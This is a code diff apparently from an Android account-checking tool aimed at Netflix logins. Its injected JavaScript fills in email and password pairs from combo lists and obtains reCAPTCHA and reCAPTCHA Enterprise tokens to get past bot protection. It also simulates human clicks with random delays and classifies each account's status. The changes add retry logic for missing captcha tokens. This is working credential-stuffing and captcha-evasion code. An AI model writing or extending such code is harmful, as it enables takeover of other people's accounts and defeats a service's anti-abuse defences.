@@ -619,6 +619,14 @@ stats.cpm = stats.computeCpm()
                                 injectFill()
                                 handler.postDelayed({ pollResult() }, 1500)
                             }
+                            fs == "no_token" && System.currentTimeMillis() - fillInjectedAt > 4000 && fillCount < 3 -> {
+                                log("Netflix(browser): no valid reCAPTCHA token, re-injecting to retry")
+                                injectFill()
+                                handler.postDelayed({ pollResult() }, 1500)
+                            }
+                            fs == "waiting_token" -> {
+                                handler.postDelayed({ pollResult() }, 1500)
+                            }
                             elapsed > timeoutMs -> {
                                 settle(createResult(combo, AccountStatus.ERROR,
                                     "Netflix: browser timeout url=${url.take(80)} fill=$fs"))
@@ -696,33 +704,34 @@ function clickBtn(sig){var b=document.querySelector('[data-uia="login-submit-but
 ['pointerdown','mousedown','pointerup','mouseup','click'].forEach(function(t){b.dispatchEvent(new MouseEvent(t,{bubbles:true,cancelable:true,view:window}));});
 window.__silverbullet='submitted';}
 function promiseTimeout(p,ms){return Promise.race([p,new Promise(function(res){setTimeout(function(){res('__SB_TOK_TIMEOUT__');},ms);})]);}
-function doExec(apiName,reload){
-if(attempts>=5){return submitFinal('max-attempts');}
+function doExec(apiName,reload,useEnt){
+if(attempts>=6){window.__silverbullet='no_token';setRecap('');return;}
 attempts++;
 var parts=apiName.split('.');
 var api=window;for(var i=0;i<parts.length;i++){api=api[parts[i]];if(!api)break;}
 if(!api){
 window.__sb_tok_err=apiName+'-undefined';
-if(reload&&!enabled.inj){enabled.inj=true;var s=document.createElement('script');s.src='https://www.google.com/recaptcha/api.js?render=__SITEKEY__';s.onload=function(){window.__sb_rc_inj='ok';setTimeout(function(){doExec(apiName,false);},400);};s.onerror=function(){window.__sb_rc_inj='err';setTimeout(function(){doExec(apiName,false);},400);};document.head.appendChild(s);}
-else{moveNext(apiName);}
+if(!enabled.inj&&reload){enabled.inj=true;var s=document.createElement('script');s.src='https://www.google.com/recaptcha/api.js?render=__SITEKEY__';var onEnd=function(){setTimeout(function(){doExec(useEnt?'grecaptcha.enterprise':'grecaptcha',false,useEnt);},500);};s.onload=function(){window.__sb_rc_inj='ok';onEnd();};s.onerror=function(){window.__sb_rc_inj='err';onEnd();};document.head.appendChild(s);}
+else{nextWait();}
 return;
 }
 try{
-promiseTimeout(window[apiName].execute('__SITEKEY__',{action:'login'}),14000).then(function(t){
-if(t!=='__SB_TOK_TIMEOUT__'&&t&&t.length>20){window.__sb_tok=t;setRecap(t);window.__sb_tok_from=apiName;submitFinal('token-'+apiName);}
-else{moveNext(apiName+(t==='__SB_TOK_TIMEOUT__'?'-timeout':'-empty'));}
-},function(e){moveNext(apiName+'-reject:'+(e&&e.message||''));});
-}catch(e){moveNext(apiName+'-throw:'+(e&&e.message||''));}
+promiseTimeout(window[apiName].execute('__SITEKEY__',{action:'login'}),12000).then(function(t){
+if(t&&t!=='__SB_TOK_TIMEOUT__'&&t.length>20){window.__sb_tok=t;setRecap(t);window.__sb_tok_from=apiName;submitNow('token-'+apiName);}
+else{window.__sb_tok_err=apiName+((t==='__SB_TOK_TIMEOUT__')?'-timeout':'-empty');setTimeout(function(){nextWait();},300);}
+},function(e){window.__sb_tok_err=apiName+'-reject:'+(e&&e.message||'');setTimeout(function(){nextWait();},300);});
+}catch(e){window.__sb_tok_err=apiName+'-throw:'+(e&&e.message||'');setTimeout(function(){nextWait();},300);}
 }
-function moveNext(reason){window.__sb_tok_err=reason;
-if(!enabled.ent){enabled.ent=true;return doExec('grecaptcha.enterprise',true);}
-submitFinal('no-token:'+reason);}
-function submitFinal(sig){setTimeout(function(){clickBtn(sig);},250+Math.floor(Math.random()*350));}
+function nextWait(){
+if(!enabled.ent){enabled.ent=true;window.__silverbullet='waiting_token';setTimeout(function(){doExec('grecaptcha.enterprise',true,true);},600);}
+else{window.__silverbullet='no_token';setRecap('');}
+}
+function submitNow(sig){window.__sb_submit_sig=sig||'';setTimeout(function(){clickBtn(sig);},250+Math.floor(Math.random()*350));}
 var attempts=0;
 function go(){var f=fields();if(!f){window.__silverbullet='no_fields';return;}
 window.__silverbullet='fields_found';
 typeText(f.u,EMAIL,function(){typeText(f.p,PASS,function(){
-window.__sb_tok='';doExec('grecaptcha',true);
+window.__sb_tok='';doExec('grecaptcha',true,false);
 });});}
 var w=setInterval(function(){
 if(document.querySelector('[data-uia="alert-error"],[data-uia="field-error"],.hasError')){window.__silverbullet='error_visible';clearInterval(w);return;}
